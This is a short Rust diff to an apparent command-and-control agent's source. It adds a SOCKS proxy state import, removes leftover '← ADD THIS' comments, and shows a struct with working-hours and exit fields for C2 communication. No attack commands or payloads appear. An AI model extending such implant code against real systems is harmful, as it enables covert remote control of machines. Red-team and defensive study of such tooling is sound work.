@@ -1,6 +1,8 @@
+// agent.rs
 use crate::payloadvars;
 use crate::tasking::Tasker;
-use std::sync::Arc;            // ← ADD THIS LINE
+use crate::socks::SocksState;  
+use std::sync::Arc;
 use chrono::prelude::{DateTime, NaiveDate};
 use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
 use rand::Rng;
@@ -80,7 +82,7 @@ pub struct SharedData {
     pub exit_agent: bool,
     pub working_start: NaiveTime,
     pub working_end: NaiveTime,
-    pub socks_state: Option<Arc<SocksState>>,  // ← ADD THIS
+    pub socks_state: Option<Arc<SocksState>>,  
 }
 
 /// Main agent struct containing information with regards to C2 communication
